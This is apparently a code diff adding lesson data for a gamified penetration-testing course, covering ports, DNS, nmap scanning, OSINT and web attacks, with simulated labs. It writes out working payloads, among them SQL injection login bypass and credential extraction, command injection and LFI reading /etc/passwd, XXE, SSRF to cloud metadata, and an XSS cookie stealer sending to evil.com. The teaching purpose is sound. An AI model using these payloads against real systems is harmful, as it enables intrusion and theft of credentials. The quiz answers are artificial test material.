+        {type:"type",q:"What file stores Linux password hashes?",a:["/etc/shadow","etc/shadow"],why:"Shadow file — only root can read it."},
+        {type:"fillin",q:"chmod ___ means: owner=rwx, group=rx, others=rx",a:["755"],why:"7=rwx, 5=r+x, 5=r+x."},
+        {type:"type",q:"Find all SUID binaries on the system:",a:["find / -perm -4000","find / -perm -4000 2>/dev/null","find / -perm -u=s"],why:"SUID binaries are key privilege escalation vectors."},
+        {type:"type",q:"Check what user you are right now:",a:["whoami","id"],why:"whoami shows your current username."},
+        {type:"match",q:"Match files to their contents:",pairs:[["/etc/passwd","User accounts"],["/etc/shadow","Password hashes"],["/var/log","System logs"],["/tmp","World-writable temp files"]],why:"Know where everything lives."},
+        {type:"type",q:"Show all TCP listening ports with process names:",a:["ss -tlnp","netstat -tlnp","ss -lntp"],why:"ss -tlnp is the modern way to check listening services."},
+        {type:"type",q:"Download a file from http://10.0.0.1/shell.php:",a:["wget http://10.0.0.1/shell.php","curl -O http://10.0.0.1/shell.php","curl http://10.0.0.1/shell.php -o shell.php"],why:"wget downloads files. curl -O saves with original filename."}
+      ]}
+    ]
+  },
+  {
+    id:"u4", title:"Networking", desc:"Understand how data flows across networks",
+    levels:[
+      {id:"u4l1",title:"Ports & Protocols",rounds:[
+        {type:"teach",text:"Computer = apartment building. IP address = street address. Ports (0-65535) = apartment numbers. Each apartment runs a different service: #22 has SSH (remote control), #80 has the website, #443 has the secure website, #445 has file sharing. Memorize these — when you scan a target, you need to know what lives behind each door."},
+        {type:"match",q:"Match ports to services:",pairs:[["22","SSH"],["80","HTTP"],["443","HTTPS"],["445","SMB"]],why:"These are the most common ports you'll encounter in pentesting."},
+        {type:"pick",q:"What service typically runs on port 3389?",opts:["RDP (Remote Desktop)","SSH","HTTP","FTP"],a:"RDP (Remote Desktop)",why:"Port 3389 = Windows Remote Desktop Protocol. Finding this open means you might be able to remote into the machine."},
+        {type:"teach",text:"TCP vs UDP: TCP is like a phone call — you ring (SYN), they answer (SYN-ACK), you confirm (ACK), then you talk. Everything guaranteed to arrive. UDP is like shouting across a room — faster but no guarantee they heard. Most services use TCP because reliability matters."},
+        {type:"order",q:"Put the TCP 3-way handshake in order:",items:["Client sends SYN","Server responds SYN-ACK","Client sends ACK"],why:"SYN → SYN-ACK → ACK establishes a TCP connection."},
+        {type:"pick",q:"Which protocol is connectionless?",opts:["UDP","TCP","HTTP","SSH"],a:"UDP",why:"UDP doesn't establish a connection — it just sends packets without confirmation."},
+        {type:"fillin",q:"FTP runs on port ___",a:["21"],why:"Port 21 is the default for FTP file transfers."},
+        {type:"fillin",q:"DNS runs on port ___",a:["53"],why:"Port 53 handles DNS lookups."}
+      ]},
+      {id:"u4l2",title:"TCP/IP & the OSI Model",rounds:[
+        {type:"teach",text:"Data travels through layers, like mailing a package. Bottom layer = the truck and roads (Physical). Middle = the routing and addresses (Network/IP). Top = what's actually inside the package (Application/HTTP). You don't need to memorize all 7 OSI layers — just know that data flows through layers from bottom to top."},
+        {type:"order",q:"Order the OSI layers from bottom (1) to top (7):",items:["Physical","Data Link","Network","Transport","Session","Presentation","Application"],why:"Layer 1 is physical hardware, Layer 7 is the application you interact with."},
+        {type:"teach",text:"IP addresses identify machines on a network. IPv4: 192.168.1.105 (4 octets, 0-255 each). Private ranges: 10.x.x.x, 172.16-31.x.x, 192.168.x.x. These don't route on the internet. Your router does NAT to translate private IPs to a public IP."},
+        {type:"pick",q:"Which IP range is private (non-routable)?",opts:["192.168.x.x","8.8.x.x","1.1.x.x","142.250.x.x"],a:"192.168.x.x",why:"192.168.0.0/16 is a private IP range used in local networks."},
+        {type:"tf",q:"Two devices on different local networks can have the same private IP address.",a:true,why:"Private IPs are only unique within their own network. 192.168.1.5 can exist on millions of different local networks."},
+        {type:"teach",text:"MAC addresses are hardware addresses (e.g., AA:BB:CC:DD:EE:FF) — unique to each network interface. They work at Layer 2 (Data Link). ARP (Address Resolution Protocol) maps IPs to MACs. ARP spoofing is a common attack."},
+        {type:"pick",q:"ARP maps what to what?",opts:["IP addresses to MAC addresses","Ports to services","Domains to IPs","Users to passwords"],a:"IP addresses to MAC addresses",why:"ARP resolves IP→MAC so devices can communicate on a local network."}
+      ]},
+      {id:"u4l3",title:"Subnets & CIDR",rounds:[
+        {type:"teach",text:"Subnetting = splitting a neighborhood into blocks. 192.168.1.0/24 means "this block has 256 addresses." The /24 is the block size: /24 = 256 houses (254 usable), /25 = 128 houses, /16 = 65,536 houses. When a pentest scope says /24, that tells you exactly how many targets you can hit."},
+        {type:"pick",q:"How many usable host IPs are in a /24 network?",opts:["254","256","128","512"],a:"254",why:"256 total minus 2 (network address + broadcast) = 254 usable."},
+        {type:"fillin",q:"The subnet mask for /24 is 255.255.255.___",a:["0"],why:"/24 means first 3 octets are all 1s (255.255.255) and last is all 0s."},
+        {type:"teach",text:"Why subnetting matters for pentesting: When given a scope like 10.10.10.0/24, you need to know that means you can scan 10.10.10.1 through 10.10.10.254. Scanning outside the scope is illegal. Common ranges you'll see: /24 (one subnet, 254 hosts), /16 (65534 hosts), /32 (single host)."},
+        {type:"pick",q:"If scope is 192.168.1.0/25, what's the last usable IP?",opts:["192.168.1.126","192.168.1.254","192.168.1.128","192.168.1.255"],a:"192.168.1.126",why:"/25 = 128 addresses (0-127). .0 is network, .127 is broadcast. Last usable is .126."},
+        {type:"tf",q:"Scanning IPs outside your defined scope is illegal even if you have a pentest contract.",a:true,why:"The scope defines exactly what you can touch. Anything outside is unauthorized access."}
+      ]},
+      {id:"u4l4",title:"DNS Deep Dive",rounds:[
+        {type:"teach",text:"DNS (Domain Name System) translates domain names to IPs. When you visit google.com, DNS resolves it to an IP like 142.250.80.46. Record types: A = domain→IPv4, AAAA = domain→IPv6, CNAME = alias, MX = mail server, TXT = text info (often SPF/DKIM), NS = nameserver."},
+        {type:"match",q:"Match DNS record types:",pairs:[["A","Domain to IPv4"],["MX","Mail server"],["CNAME","Alias for another domain"],["TXT","Text info (SPF, verification)"]],why:"DNS records reveal a lot about a target's infrastructure."},
+        {type:"teach",text:"DNS enumeration tools: nslookup domain.com queries DNS. dig domain.com gives detailed output. dig axfr @ns.domain.com domain.com attempts a zone transfer (dumps ALL DNS records — jackpot if it works). host -t mx domain.com gets mail servers.",os:{linux:"$ dig example.com\n$ nslookup example.com\n$ dig axfr @ns1.example.com example.com\n$ host -t mx example.com",windows:"PS> nslookup example.com\nPS> Resolve-DnsName example.com -Type MX",mac:"Same as Linux — dig, nslookup, host"}},
+        {type:"type",q:"Look up the DNS records for target.com:",a:["dig target.com","nslookup target.com","host target.com","Resolve-DnsName target.com"],why:"dig and nslookup are the primary DNS lookup tools."},
+        {type:"type",q:"Attempt a DNS zone transfer on target.com from ns1.target.com:",a:["dig axfr @ns1.target.com target.com","dig axfr target.com @ns1.target.com","host -t axfr target.com ns1.target.com"],why:"Zone transfers dump all DNS records — a goldmine for recon if the server allows it."},
+        {type:"pick",q:"What DNS record type tells you the mail server for a domain?",opts:["MX","A","CNAME","NS"],a:"MX",why:"MX = Mail eXchange record — points to the domain's email server."}
+      ]},
+      {id:"u4l5",title:"Mastery Test: Networking",rounds:[
+        {type:"fillin",q:"SSH runs on port ___",a:["22"],why:"Port 22 is SSH."},
+        {type:"fillin",q:"HTTP runs on port ___",a:["80"],why:"Port 80 is HTTP."},
+        {type:"fillin",q:"SMB runs on port ___",a:["445"],why:"Port 445 is SMB (Windows file sharing)."},
+        {type:"order",q:"TCP handshake order:",items:["SYN","SYN-ACK","ACK"],why:"The three-way handshake."},
+        {type:"type",q:"What resolves domain names to IP addresses?",a:["dns","DNS","domain name system"],why:"DNS is the phonebook of the internet."},
+        {type:"type",q:"Attempt a DNS zone transfer for target.com from ns1.target.com:",a:["dig axfr @ns1.target.com target.com","dig axfr target.com @ns1.target.com"],why:"Zone transfers reveal all DNS records."},
+        {type:"pick",q:"How many usable hosts in a /24 subnet?",opts:["254","256","128","255"],a:"254",why:"256 - 2 (network + broadcast) = 254."},
+        {type:"type",q:"What protocol maps IP addresses to MAC addresses?",a:["arp","ARP","address resolution protocol"],why:"ARP resolves IP to MAC at Layer 2."}
+      ]}
+    ]
+  }
+];
+
+// UNITS 5-7: Scanning & Recon, Web Attacks, Exploitation Tools
+const UNITS_5_7 = [
+  {
+    id:"u5", title:"Scanning & Recon", desc:"Discover targets, ports, services, and hidden info",
+    levels:[
+      {id:"u5l1",title:"Nmap Basics",rounds:[
+        {type:"teach",text:"Nmap is your radar — THE most important scanning tool. It finds which computers are alive, what doors (ports) are open, and what's behind each door. nmap target checks the 1000 most common doors. nmap -p- checks ALL 65,535 doors. Always start with nmap."},
+        {type:"type",q:"Scan all 65535 ports on 10.10.10.5:",a:["nmap -p- 10.10.10.5","nmap -p- 10.10.10.5"],why:"nmap -p- scans every port. Without it, only top 1000 are scanned."},
+        {type:"type",q:"Scan only ports 80 and 443 on the target:",a:["nmap -p 80,443 10.10.10.5","nmap -p80,443 10.10.10.5"],why:"-p lets you specify exact ports to scan."},
+        {type:"teach",text:"Service detection: nmap -sV tries to identify what software and version is running on each port (e.g., Apache 2.4.41, OpenSSH 7.6). OS detection: nmap -O tries to guess the target OS. Combine: nmap -sV -O -p- target."},
+        {type:"build",q:"Build a full scan: all ports, service versions, OS detection, on 10.10.10.5:",parts:["nmap","-p-","-sV","-O","10.10.10.5"],answer:["nmap","-p-","-sV","-O","10.10.10.5"],why:"This is the 'kitchen sink' scan — finds everything."},
+        {type:"teach",text:"Save results: -oN file.txt (normal output), -oX file.xml (XML), -oA basename (all formats). Always save your scans! nmap -sV -p- 10.10.10.5 -oA full_scan saves as full_scan.nmap, full_scan.xml, full_scan.gnmap."},
+        {type:"type",q:"Run a full scan and save output in all formats as 'recon':",a:["nmap -sV -p- 10.10.10.5 -oA recon","nmap -p- -sV -O 10.10.10.5 -oA recon","nmap -sV -O -p- 10.10.10.5 -oA recon"],why:"-oA saves in normal, XML, and greppable formats at once."}
+      ]},
+      {id:"u5l2",title:"Scan Types & Stealth",rounds:[
+        {type:"teach",text:"Nmap scan types: -sS (SYN scan) = knock on the door but run away before they open it — stealthy. -sT (TCP connect) = knock, shake hands, have a conversation — louder but reliable. -sU = check the side doors (UDP). -sn = just check which houses have lights on (alive check, no port scan)."},
+        {type:"pick",q:"Which scan type is stealthier — SYN or TCP connect?",opts:["SYN (-sS)","TCP connect (-sT)","UDP (-sU)","Ping sweep (-sn)"],a:"SYN (-sS)",why:"SYN scan sends SYN but never completes the handshake — harder to detect in logs."},
+        {type:"type",q:"Do a ping sweep to find alive hosts in 192.168.1.0/24:",a:["nmap -sn 192.168.1.0/24"],why:"-sn = ping sweep. Finds which hosts are up without scanning ports."},
+        {type:"teach",text:"Evasion: -T0 through -T5 control speed (T0=paranoid/slow, T5=insane/fast). -f fragments packets. --data-length adds random data. -D decoy1,decoy2 makes it look like multiple IPs are scanning. --source-port 53 pretends traffic is DNS."},
+        {type:"build",q:"Build a stealthy scan: SYN, slow timing, fragmented packets:",parts:["nmap","-sS","-T2","-f","10.10.10.5"],answer:["nmap","-sS","-T2","-f","10.10.10.5"],why:"SYN scan + slow timing + fragmentation = harder to detect."},
+        {type:"type",q:"Scan UDP ports on the target:",a:["nmap -sU 10.10.10.5","sudo nmap -sU 10.10.10.5"],why:"-sU scans UDP ports. Often overlooked but can reveal DNS(53), SNMP(161), TFTP(69)."}
+      ]},
+      {id:"u5l3",title:"Nmap Scripts & Advanced",rounds:[
+        {type:"teach",text:"NSE (Nmap Scripting Engine) has 600+ scripts for vulnerability detection, brute forcing, and enumeration. --script=default runs standard scripts. --script=vuln checks for known vulnerabilities. --script=http-enum finds web directories."},
+        {type:"type",q:"Run vulnerability scripts against 10.10.10.5:",a:["nmap --script=vuln 10.10.10.5","nmap --script vuln 10.10.10.5","nmap -sV --script=vuln 10.10.10.5"],why:"--script=vuln runs all vulnerability detection scripts."},
+        {type:"teach",text:"Useful scripts: smb-vuln-ms17-010 (EternalBlue check), http-title (grab page titles), ftp-anon (check anonymous FTP), ssh-brute (brute force SSH). Run specific ones: --script=http-title,ftp-anon"},
+        {type:"build",q:"Build: scan port 445, check for EternalBlue vulnerability:",parts:["nmap","-p","445","--script=smb-vuln-ms17-010","10.10.10.5"],answer:["nmap","-p","445","--script=smb-vuln-ms17-010","10.10.10.5"],why:"This checks specifically for MS17-010 (EternalBlue) — one of the most famous Windows exploits."},
+        {type:"teach",text:"Aggressive scan: nmap -A combines -sV (versions), -O (OS), --script=default (scripts), and --traceroute. It's noisy but thorough. Use on CTFs, not real engagements where stealth matters."},
+        {type:"type",q:"Run an aggressive scan on the target:",a:["nmap -A 10.10.10.5","nmap -A -p- 10.10.10.5"],why:"-A = aggressive mode. Combines version detection, OS detection, scripts, and traceroute."}
+      ]},
+      {id:"u5l4",title:"OSINT & Passive Recon",rounds:[
+        {type:"teach",text:"OSINT (Open Source Intelligence) = gathering info WITHOUT touching the target. Sources: WHOIS (domain registration), Google dorking (advanced search), Shodan (search engine for devices), social media, job postings (reveal tech stack), public code repos."},
+        {type:"teach",text:"Google dorks: site:target.com filetype:pdf finds PDFs. intitle:'index of' finds directory listings. inurl:admin finds admin pages. site:target.com intext:password finds pages mentioning password."},
+        {type:"type",q:"Google dork to find PDF files on target.com:",a:["site:target.com filetype:pdf"],why:"Google dorking uses advanced operators to find specific content indexed by Google."},
+        {type:"teach",text:"WHOIS: whois target.com shows domain registration info — owner name, email, registrar, name servers, dates. theHarvester collects emails, subdomains, and IPs from public sources. Shodan.io indexes internet-connected devices."},
+        {type:"type",q:"Look up domain registration info for target.com:",a:["whois target.com"],why:"WHOIS reveals the domain owner, registrar, nameservers, and sometimes contact info."},
+        {type:"pick",q:"Which tool is a search engine for internet-connected devices?",opts:["Shodan","Google","Nmap","Burp Suite"],a:"Shodan",why:"Shodan indexes devices by scanning the internet — you can find webcams, databases, servers, etc."},
+        {type:"teach",text:"Subdomain enumeration: sublist3r, subfinder, amass find subdomains like dev.target.com, staging.target.com, api.target.com. Subdomains often have weaker security than the main site."},
+        {type:"type",q:"What kind of recon is checking someone's LinkedIn profile?",a:["passive","passive recon","osint","OSINT"],why:"You're not touching the target's systems — just viewing public info."}
+      ]},
+      {id:"u5l5",title:"Web Enumeration",rounds:[
+        {type:"teach",text:"After finding a web server, enumerate it. gobuster/dirb/dirsearch brute-force discover hidden directories and files. gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt finds /admin, /backup, /config, etc."},
+        {type:"type",q:"Brute force directories on http://10.10.10.5 with gobuster:",a:["gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirb/common.txt","gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"],why:"gobuster dir brute-forces directory names using a wordlist."},
+        {type:"teach",text:"nikto — web vulnerability scanner. Checks for outdated software, dangerous files, misconfigurations. nikto -h http://target scans the web server. It's noisy but finds a LOT."},
+        {type:"type",q:"Run nikto against the target web server:",a:["nikto -h http://10.10.10.5","nikto -h 10.10.10.5"],why:"nikto scans for known web vulnerabilities and misconfigs."},
+        {type:"teach",text:"whatweb — fingerprints the web server tech stack: CMS (WordPress, Joomla), framework (Django, Rails), server (Apache, Nginx), language (PHP, Python). Knowing the stack helps you find specific exploits."},
+        {type:"type",q:"Identify what technologies a website is running:",a:["whatweb http://10.10.10.5","whatweb 10.10.10.5"],why:"whatweb fingerprints the tech stack — CMS, frameworks, server software."},
+        {type:"teach",text:"robots.txt and sitemap.xml — always check these first! robots.txt tells search engines what NOT to index — which means it often reveals hidden admin panels and sensitive paths. curl http://target/robots.txt"},
+        {type:"type",q:"Check what paths the target is hiding from search engines:",a:["curl http://10.10.10.5/robots.txt","curl http://target/robots.txt"],why:"robots.txt often reveals interesting hidden paths."}
+      ]},
+      {id:"u5lab",title:"LAB: Scan the Bank",rounds:[
+        {type:"lab",title:"Penetrate SecureBank Corp",objective:"You've been hired to pentest SecureBank. Scan their server, find services, and identify vulnerabilities.",
+          banner:"=== SecureBank Corp Pentest ===\nTarget: 10.10.10.88\nScope: Full port scan authorized\nGood luck, operator.\n",
+          steps:[
+            {hint:"Start with a ping to confirm the target is alive.",accept:["ping 10.10.10.88","ping -c 1 10.10.10.88","~ping 10.10.10","nmap -sn 10.10.10.88"],output:"PING 10.10.10.88: 64 bytes from 10.10.10.88: icmp_seq=1 ttl=64 time=12.3ms\n--- 10.10.10.88 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss",successMsg:"Target is alive!",example:"ping 10.10.10.88",quickCmds:["ping 10.10.10.88","nmap -sn 10.10.10.88"]},
+            {hint:"Run a full port scan with service version detection.",accept:["nmap -p- -sV 10.10.10.88","nmap -sV -p- 10.10.10.88","~nmap -sV","~nmap -p-"],output:"PORT     STATE SERVICE    VERSION\n22/tcp   open  ssh        OpenSSH 7.6p1\n80/tcp   open  http       Apache 2.4.29\n443/tcp  open  ssl/http   Apache 2.4.29\n3306/tcp open  mysql      MySQL 5.7.33\n8080/tcp open  http-proxy Squid 3.5.27\n\nService detection performed.",successMsg:"5 open ports found! SSH, Web, HTTPS, MySQL, and a proxy.",example:"nmap -p- -sV 10.10.10.88",quickCmds:["nmap -p- -sV 10.10.10.88","nmap -sV 10.10.10.88"]},
+            {hint:"Run vulnerability scripts against the web server on port 80.",accept:["nmap --script=vuln -p 80 10.10.10.88","~--script=vuln","~--script vuln","nmap --script vuln 10.10.10.88"],output:"PORT   STATE SERVICE\n80/tcp open  http\n| http-sql-injection: \n|   Possible sqli at: /login.php?user=\n| http-enum:\n|   /admin/: Admin panel\n|   /backup/: Backup directory\n|   /robots.txt: Robots file\n|_  /phpmyadmin/: phpMyAdmin",successMsg:"Found SQL injection on login and exposed admin panel!",example:"nmap --script=vuln -p 80 10.10.10.88",quickCmds:["nmap --script=vuln -p 80 10.10.10.88"]},
+            {hint:"Check what the robots.txt reveals.",accept:["curl http://10.10.10.88/robots.txt","~robots.txt","~curl 10.10.10.88/robots"],output:"User-agent: *\nDisallow: /admin/\nDisallow: /backup/db_dump.sql\nDisallow: /internal/api/v1/",successMsg:"robots.txt reveals a database dump and internal API!",example:"curl http://10.10.10.88/robots.txt",quickCmds:["curl http://10.10.10.88/robots.txt"]},
+            {hint:"Check the EternalBlue vulnerability on the MySQL port... wait, that's SMB. Run vuln scripts on all ports to be thorough.",accept:["nmap --script=vuln 10.10.10.88","~--script=vuln 10.10.10","nmap -A 10.10.10.88"],output:"PORT     STATE SERVICE\n22/tcp   open  ssh - No vulns found\n80/tcp   open  http - SQL injection, dir listing\n3306/tcp open  mysql - Anonymous login ALLOWED\n8080/tcp open  proxy - Open proxy detected\n\n[+] CRITICAL: MySQL allows anonymous login!\n[+] HIGH: SQL injection on /login.php\n[+] MEDIUM: Open proxy on 8080\n[+] LOW: Directory listing on /backup/",successMsg:"Full vulnerability report complete! You'd now document all this in your pentest report.",example:"nmap --script=vuln 10.10.10.88",quickCmds:["nmap --script=vuln 10.10.10.88","nmap -A 10.10.10.88"]},
+          ]},
+      ]},
+      {id:"u5l6",title:"Mastery Test: Scanning & Recon",rounds:[
+        {type:"type",q:"Scan ALL ports with service versions on 10.10.10.5:",a:["nmap -p- -sV 10.10.10.5","nmap -sV -p- 10.10.10.5"],why:"Full port scan + version detection."},
+        {type:"type",q:"Do a ping sweep on 10.10.10.0/24:",a:["nmap -sn 10.10.10.0/24"],why:"Find alive hosts without port scanning."},
+        {type:"type",q:"Run vulnerability scripts on the target:",a:["nmap --script=vuln 10.10.10.5","nmap --script vuln 10.10.10.5"],why:"NSE vuln scripts check for known vulnerabilities."},
+        {type:"type",q:"Google dork: find login pages on target.com:",a:["site:target.com inurl:login","site:target.com intitle:login","site:target.com inurl:admin"],why:"Google dorks find specific content indexed by search engines."},
+        {type:"type",q:"Brute force web directories on the target:",a:["gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirb/common.txt","dirb http://10.10.10.5","dirsearch -u http://10.10.10.5"],why:"Directory brute forcing reveals hidden paths."},
+        {type:"type",q:"Scan for web vulnerabilities with nikto:",a:["nikto -h http://10.10.10.5","nikto -h 10.10.10.5"],why:"nikto checks for common web server vulnerabilities."},
+        {type:"type",q:"Look up domain registration for target.com:",a:["whois target.com"],why:"WHOIS reveals domain ownership and registration details."}
+      ]}
+    ]
+  },
+  {
+    id:"u6", title:"Web Attacks", desc:"SQL injection, XSS, command injection, and more",
+    levels:[
+      {id:"u6l1",title:"HTTP Fundamentals",rounds:[
+        {type:"teach",text:"HTTP is how browsers talk to servers. A request has: method (GET, POST, PUT, DELETE), URL, headers (Host, Cookie, User-Agent), and optionally a body (for POST). The server responds with: status code (200=OK, 301=redirect, 403=forbidden, 404=not found, 500=server error), headers, and body (HTML/JSON)."},
+        {type:"match",q:"Match HTTP status codes:",pairs:[["200","OK — Success"],["403","Forbidden — No access"],["404","Not Found"],["500","Internal Server Error"]],why:"Knowing status codes helps you understand server responses during testing."},
+        {type:"teach",text:"Methods: GET requests data (parameters in URL: ?id=1&name=test). POST sends data in the body (login forms, file uploads). PUT updates resources. DELETE removes them. HEAD gets headers only (useful for recon)."},
+        {type:"pick",q:"Where do GET parameters appear?",opts:["In the URL","In the request body","In cookies","In headers only"],a:"In the URL",why:"GET params go in the URL: http://site.com/page?param=value. POST params go in the body."},
+        {type:"teach",text:"Cookies track sessions. When you log in, the server sets a cookie (Set-Cookie: session=abc123). Your browser sends it back with every request (Cookie: session=abc123). Stealing someone's cookie = stealing their session."},
+        {type:"pick",q:"If you steal a user's session cookie, what can you do?",opts:["Access their account","See their password","Crash the server","Nothing"],a:"Access their account",why:"Session cookies authenticate you. With someone's cookie, the server thinks you're them."},
+        {type:"teach",text:"curl lets you craft HTTP requests manually. curl -X POST -d 'user=admin&pass=test' http://target/login sends a POST. curl -b 'session=abc' sends with a cookie. curl -H 'X-Custom: value' adds headers."},
+        {type:"build",q:"Build a curl POST request to login with user=admin, pass=password123:",parts:["curl","-X POST","-d","'user=admin&pass=password123'","http://target/login"],answer:["curl","-X POST","-d","'user=admin&pass=password123'","http://target/login"],why:"curl -X POST -d sends form data in the request body."}
+      ]},
+      {id:"u6l2",title:"SQL Injection (SQLi)",rounds:[
+        {type:"teach",text:"SQL Injection: the login page asks for your name and plugs it directly into a command. It's like a robot guard that follows instructions too literally. If you say "my name is admin'--" the guard hears "let admin in" and ignores the password because -- means "forget everything after this." You just walked in without knowing the password."},
+        {type:"teach",text:"Testing for SQLi: Add a single quote ' to inputs. If you get a database error, it's likely vulnerable. Try: ' OR 1=1-- (returns all rows), ' UNION SELECT null,null-- (extract data from other tables), admin'-- (bypass login)."},
+        {type:"pick",q:"What does ' OR 1=1-- do in a vulnerable login?",opts:["Returns all users (bypasses auth)","Deletes the database","Shows the source code","Nothing"],a:"Returns all users (bypasses auth)",why:"OR 1=1 is always true, so the WHERE clause matches everything. -- comments out the rest."},
+        {type:"type",q:"What character do you type first to test for SQL injection?",a:["'","single quote","'"],why:"A single quote breaks out of the SQL string. If it causes an error, the input isn't sanitized."},
+        {type:"teach",text:"UNION injection: Lets you read data from other tables. First find the column count: ' ORDER BY 1--, ' ORDER BY 2--, etc. until it errors. Then: ' UNION SELECT username,password FROM users-- to extract credentials."},
+        {type:"build",q:"Build a UNION payload to extract usernames and passwords:",parts:["' UNION SELECT","username,password","FROM users","--"],answer:["' UNION SELECT","username,password","FROM users","--"],why:"UNION SELECT appends results from another table to the original query."},
+        {type:"teach",text:"sqlmap automates SQLi. sqlmap -u 'http://target/page?id=1' --dbs lists databases. --tables lists tables. --dump extracts data. It finds and exploits injection points automatically."},
+        {type:"type",q:"Use sqlmap to find databases on a vulnerable URL:",a:["sqlmap -u 'http://target/page?id=1' --dbs","sqlmap -u http://target/page?id=1 --dbs"],why:"sqlmap automates SQL injection — --dbs lists all databases."}
+      ]},
+      {id:"u6l3",title:"XSS & More Injection",rounds:[
+        {type:"teach",text:"XSS = planting a booby trap on a website. You hide code in a comment or message. When someone else views it, the trap springs in THEIR browser — it can steal their login cookie (like copying their house key). Stored XSS = the trap stays forever in the database. Reflected XSS = only works through a special trick link."},
+        {type:"pick",q:"Which XSS type is most dangerous?",opts:["Stored — persists in database","Reflected — in URL only","DOM-based","None are dangerous"],a:"Stored — persists in database",why:"Stored XSS affects every user who views the page — it's saved permanently."},
+        {type:"teach",text:"XSS payloads: <script>document.location='http://evil.com/steal?c='+document.cookie</script> steals cookies. <img src=x onerror=alert(1)> bypasses basic script tag filters. <svg onload=alert(1)> is another bypass."},
+        {type:"type",q:"Basic XSS test payload:",a:["<script>alert(1)</script>","<script>alert('XSS')</script>","<img src=x onerror=alert(1)>"],why:"If alert(1) pops up, the site is vulnerable to XSS."},
+        {type:"teach",text:"Command Injection — when a web app passes user input to a system command. If a ping tool does: ping INPUT and you type 127.0.0.1; cat /etc/passwd — it runs BOTH commands. Separators: ; (run both), && (run second if first succeeds), | (pipe), || (run second if first fails)."},
+        {type:"type",q:"Inject a command to read /etc/passwd through a vulnerable ping form:",a:["127.0.0.1; cat /etc/passwd","127.0.0.1 ; cat /etc/passwd","| cat /etc/passwd","; cat /etc/passwd"],why:"; separates commands — the server runs ping AND cat."},
+        {type:"teach",text:"Local File Inclusion (LFI) — when a page includes files based on user input: page.php?file=about.html. Try: page.php?file=../../../../etc/passwd to read system files by traversing directories with ../"},
+        {type:"type",q:"LFI payload to read /etc/passwd:",a:["../../../../etc/passwd","../../../etc/passwd","....//....//....//etc/passwd"],why:"../ traverses up directories to reach /etc/passwd from the web root."}
+      ]},
+      {id:"u6l4",title:"IDOR & Access Control",rounds:[
+        {type:"teach",text:"IDOR (Insecure Direct Object Reference) — when you can access other users' data by changing an ID in the URL or request. Example: /profile?id=123 shows your profile. Change to /profile?id=124 — if it shows someone else's data, that's IDOR. No hacking tools needed, just change numbers."},
+        {type:"pick",q:"You're logged in and see /api/invoice/456. You change it to /api/invoice/457 and see another user's invoice. What is this?",opts:["IDOR","SQL Injection","XSS","CSRF"],a:"IDOR",why:"IDOR = accessing objects you shouldn't by changing direct references (IDs, filenames, etc)."},
+        {type:"teach",text:"Testing IDOR: Create 2 accounts. Use account A to access resources, note the IDs. Switch to account B and try accessing account A's IDs. Check: profile pages, API endpoints, file downloads, order histories, messages."},
+        {type:"teach",text:"CSRF (Cross-Site Request Forgery) — trick a logged-in user into making a request they didn't intend. If a bank transfer URL is /transfer?to=attacker&amount=1000, you could embed it in an image tag on another site. The victim's browser sends it with their session cookie."},
+        {type:"pick",q:"CSRF works because:",opts:["Browsers auto-send cookies with requests","Passwords are weak","The server is slow","JavaScript is enabled"],a:"Browsers auto-send cookies with requests",why:"The browser automatically includes session cookies, so the server thinks the victim initiated the action."},
+        {type:"tf",q:"IDOR can sometimes be found by simply changing a number in the URL.",a:true,why:"That's the simplest form of IDOR — increment an ID and see if you get unauthorized data."}
+      ]},
+      {id:"u6l5",title:"SSRF & XXE",rounds:[
+        {type:"teach",text:"SSRF (Server-Side Request Forgery) — you trick the server into making requests on your behalf. If a site has a 'fetch URL' feature, try: http://localhost/admin or http://169.254.169.254/latest/meta-data/ (AWS metadata). The server fetches internal resources you can't reach directly."},
+        {type:"pick",q:"What makes SSRF dangerous?",opts:["Server can access internal networks you can't","It deletes files","It's undetectable","It only works on old servers"],a:"Server can access internal networks you can't",why:"The server has access to internal services, localhost, and cloud metadata — things you can't reach from outside."},
+        {type:"teach",text:"XXE (XML External Entity) — when a server parses XML input, you can define external entities that read files or make requests. Payload: <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root> — this reads /etc/passwd through XML parsing."},
+        {type:"pick",q:"XXE exploits what type of input parsing?",opts:["XML","JSON","HTML","CSV"],a:"XML",why:"XXE specifically targets XML parsers that process external entity definitions."},
+        {type:"tf",q:"SSRF can be used to access cloud metadata endpoints like AWS instance credentials.",a:true,why:"169.254.169.254 is the AWS metadata endpoint — SSRF to it can leak IAM credentials."}
+      ]},
+      {id:"u6lab",title:"LAB: Hack the Login",rounds:[
+        {type:"lab",title:"SQL Injection Attack",objective:"Bypass the login page of MegaCorp's employee portal using SQL injection, then extract the admin credentials.",
+          banner:"=== MegaCorp Employee Portal Pentest ===\nTarget: http://10.10.10.99/login.php\nYou see a login form with Username and Password fields.\n",
+          steps:[
+            {hint:"Test if the login is vulnerable to SQL injection. Try a single quote in the username field.",accept:["' ","~'","~single quote"],output:"Error: You have an error in your SQL syntax near '''' at line 1\nMySQL server version: 5.7.33\n\n[!] The app returned a SQL error \u2014 it's vulnerable!",successMsg:"SQL error means the input isn't sanitized!",example:"'",placeholder:"Type what you'd enter as username...",quickCmds:["'","test","admin"]},
+            {hint:"Now bypass the login. Use SQL injection to log in as admin without knowing the password.",accept:["admin'--","admin' --","~admin'--","~' OR 1=1--","' or 1=1--","admin' or 1=1--"],output:"HTTP/1.1 302 Found\nLocation: /dashboard.php\nSet-Cookie: session=eyJhZG1pbiI6dHJ1ZX0=\n\n[+] Login successful! Redirected to admin dashboard.\nWelcome, admin!",successMsg:"You're in! The -- commented out the password check.",example:"admin'--",quickCmds:["admin'--","' OR 1=1--","admin' or 1=1--"]},
+            {hint:"Now find how many columns the query returns. Use ORDER BY to test.",accept:["~ORDER BY","' ORDER BY 1--","' order by 3--","' ORDER BY 3--"],output:"' ORDER BY 1-- \u2192 OK\n' ORDER BY 2-- \u2192 OK\n' ORDER BY 3-- \u2192 OK\n' ORDER BY 4-- \u2192 ERROR\n\nThe query has 3 columns.",successMsg:"3 columns! Now you can use UNION SELECT.",example:"' ORDER BY 3--",quickCmds:["' ORDER BY 1--","' ORDER BY 3--","' ORDER BY 4--"]},
